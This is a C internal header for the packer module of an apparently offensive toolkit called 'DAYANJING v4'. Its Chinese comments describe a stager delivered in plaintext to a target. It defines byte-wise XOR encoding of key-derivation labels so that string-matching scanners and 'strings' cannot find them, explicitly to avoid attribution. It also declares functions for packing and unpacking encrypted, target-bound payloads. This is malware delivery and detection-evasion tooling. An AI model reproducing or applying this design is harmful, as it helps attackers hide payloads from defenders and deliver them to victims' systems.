/*
 * DAYANJING v4 — 20_packer / pack_int.h
 *
 * 模块内部接口：不对外暴露，仅供 src/ 下各编译单元共享。
 * 对外公共接口一律在 include/packer.h。
 */

#ifndef DAYANJING_PACK_INT_H
#define DAYANJING_PACK_INT_H

#include <stddef.h>
#include <stdint.h>

#include "packer.h"

/*
 * 域分离标签的存放方式。
 *
 * HKDF 的 salt / info 只是"唯一字节串"，本身不是秘密，因此过去直接写成
 * 可读串。但那会在 .rodata 里留下 "dayanjing:packer:*" —— 任何按串匹配的
 * 扫描器都能据此归因，而 stager 是明文投送到目标的第一段代码，没有制品
 * 加密层保护，这条暴露尤其致命。
 *
 * 这里改为逐字节异或存放：
 *   - 字节值与原标签**完全相同**，派生结果不变，不破坏任何既有制品兼容
 *   - 键取 0xc3，使小写 ASCII 与 ':' 全部落在 >= 0x80，
 *     GNU strings 默认只输出 ASCII 串，故 .rodata 中不再可见
 *
 * 必须说清：这是**混淆不是保密**。标签本就公开，且任何静态常量逆向者都
 * 取得到。它防的是"按串匹配归因"，不是"被分析"。
 */
#define PK_LABEL_KEY 0xc3u
#define PK_LB(c) ((uint8_t)((unsigned char)(c) ^ PK_LABEL_KEY))
#define PK_LABEL_DEC(out, obf, n)                                    \
    do {                                                             \
        for (size_t _i = 0; _i < (n); _i++)                          \
            (out)[_i] = (uint8_t)((obf)[_i] ^ PK_LABEL_KEY);         \
    } while (0)

/* AAD 长度随版本变化：v1 = 80，v2 = 112（多 bind_id 32），
 * v3 = 148（再多 epoch 4 + eph_pub 32） */
#define PK_AAD_V1_LEN 80u
#define PK_AAD_V2_LEN 112u
#define PK_AAD_V3_LEN 148u

/*
 * 打包核心。version 为 PK_VERSION / PK_VERSION2 / PK_VERSION3。
 * version>=2 时 bind_id 必须非 NULL，写入头并纳入 AAD；
 * version==3 时 epoch/eph_pub 一并写入头并纳入 AAD；
 * version==1 时这些字段忽略（头中该区全零）。
 *
 * 注意：v1 仅供内部压测 LZSS/AES 层使用，pk_unpack 已拒绝解 v1 制品。
 */
int pk_pack_core(const uint8_t *raw, size_t raw_len,
                 const uint8_t *seed, size_t seed_len,
                 uint32_t version,
                 const uint8_t bind_id[PK_BIND_ID_LEN],
                 uint32_t epoch,
                 const uint8_t eph_pub[PK_EPH_PUB_LEN],
                 uint8_t *out, size_t *out_len);

/*
 * 解包核心。按头部声明的版本构造对应 AAD 并验签。
 * 不检查 bind_id 是否匹配——那是 pk_unpack_session 的职责。
 */
int pk_unpack_core(const uint8_t *blob, size_t blob_len,
                   const uint8_t *seed, size_t seed_len,
                   uint8_t *out, size_t *out_len);

/* ---- 共享原语：pack.c 与 shaped.c 共用，避免重复实现 ---- */

void      put32(uint8_t *p, uint32_t v);
void      put64(uint8_t *p, uint64_t v);
uint32_t  get32(const uint8_t *p);
uint64_t  get64(const uint8_t *p);

/* 熵源：getrandom(2) 优先，失败回落 /dev/urandom */
int       pk_rand(uint8_t *buf, size_t len);

/* HKDF-Extract(salt, seed) -> Expand("dayanjing:packer:v1") -> AES 密钥 */
int       pk_derive_key(const uint8_t *salt, size_t salt_len,
                        const uint8_t *seed, size_t seed_len,
                        uint8_t key[PK_KEY_LEN]);

#endif /* DAYANJING_PACK_INT_H */
